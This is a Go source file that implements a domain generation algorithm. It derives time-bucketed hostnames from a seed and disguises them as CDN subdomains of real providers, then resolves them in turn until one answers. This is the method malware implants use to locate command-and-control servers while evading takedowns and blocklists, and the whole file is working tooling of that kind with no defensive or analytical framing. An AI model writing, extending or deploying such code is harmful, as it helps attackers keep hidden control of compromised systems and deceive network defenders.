package networking

import (
	"context"
	"crypto/sha256"
	"encoding/hex"
	"fmt"
	mathrand "math/rand"
	"strings"
	"time"
)

// DGAConfig controls deterministic domain generation.
type DGAConfig struct {
	Seed        string        // operator-provided seed material
	BaseDomains []string      // candidate parent domains (cdn-like)
	Words       []string      // wordlist for host labels
	Count       int           // how many candidates per epoch
	Epoch       time.Duration // bucket size for time-based determinism
}

func (c DGAConfig) withDefaults() DGAConfig {
	if c.Seed == "" {
		c.Seed = "apa-dga-seed"
	}
	if len(c.BaseDomains) == 0 {
		c.BaseDomains = []string{"cdn.cloudflare.net", "fastly.net", "akamaihd.net", "edgekey.net"}
	}
	if len(c.Words) == 0 {
		c.Words = []string{"img", "static", "edge", "api", "asset", "res", "cdn", "data", "map", "tile"}
	}
	if c.Count <= 0 {
		c.Count = 8
	}
	if c.Epoch <= 0 {
		c.Epoch = 30 * time.Minute
	}
	return c
}

// DeterministicNamer generates deterministic domain candidates using time, seed, and entropy.
type DeterministicNamer struct {
	cfg DGAConfig
}

// NewDeterministicNamer returns a new deterministic domain generator.
func NewDeterministicNamer(cfg DGAConfig) *DeterministicNamer {
	return &DeterministicNamer{cfg: cfg.withDefaults()}
}

// Candidates returns deterministic domain names for the provided time and entropy blob.
// The same inputs will always yield the same ordered candidates.
func (d *DeterministicNamer) Candidates(t time.Time, entropy []byte) []string {
	cfg := d.cfg
	bucket := t.UTC().Truncate(cfg.Epoch)
	seedMaterial := fmt.Sprintf("%s|%d|%d|%s", cfg.Seed, bucket.Unix(), cfg.Count, hex.EncodeToString(entropy))
	sum := sha256.Sum256([]byte(seedMaterial))

	// use math/rand with a deterministic seed derived from the hash
	rng := mathrand.New(mathrand.NewSource(int64(binaryPivot(sum))))

	candidates := make([]string, 0, cfg.Count)
	for i := 0; i < cfg.Count; i++ {
		w1 := cfg.Words[rng.Intn(len(cfg.Words))]
		w2 := cfg.Words[rng.Intn(len(cfg.Words))]
		hexTail := hex.EncodeToString(sum[:])
		label := fmt.Sprintf("%s-%s-%s", w1, w2, hexTail[2+i:6+i])
		domain := cfg.BaseDomains[rng.Intn(len(cfg.BaseDomains))]
		candidates = append(candidates, strings.ToLower(label+"."+domain))
	}
	return candidates
}

// ResolveFirst attempts resolution of candidates in order until one succeeds.
// It returns the first successful name and the resolved addresses.
type hostResolver interface {
	LookupHost(ctx context.Context, host string) ([]string, error)
}

func ResolveFirst(ctx context.Context, r hostResolver, candidates []string) (string, []string, error) {
	var errs []string
	for _, name := range candidates {
		addrs, err := r.LookupHost(ctx, name)
		if err == nil && len(addrs) > 0 {
			return name, addrs, nil
		}
		if err != nil {
			errs = append(errs, fmt.Sprintf("%s: %v", name, err))
		}
	}
	return "", nil, fmt.Errorf("no resolution succeeded; tried %d candidates: %s", len(candidates), strings.Join(errs, "; "))
}

// binaryPivot turns the first 8 bytes of a hash into an int64 seed.
func binaryPivot(sum [32]byte) int64 {
	// little endian interpretation of first 8 bytes
	var v int64
	for i := 0; i < 8; i++ {
		v |= int64(sum[i]) << (8 * i)
	}
	if v == 0 {
		v = 1 // avoid zero seed
	}
	return v
}
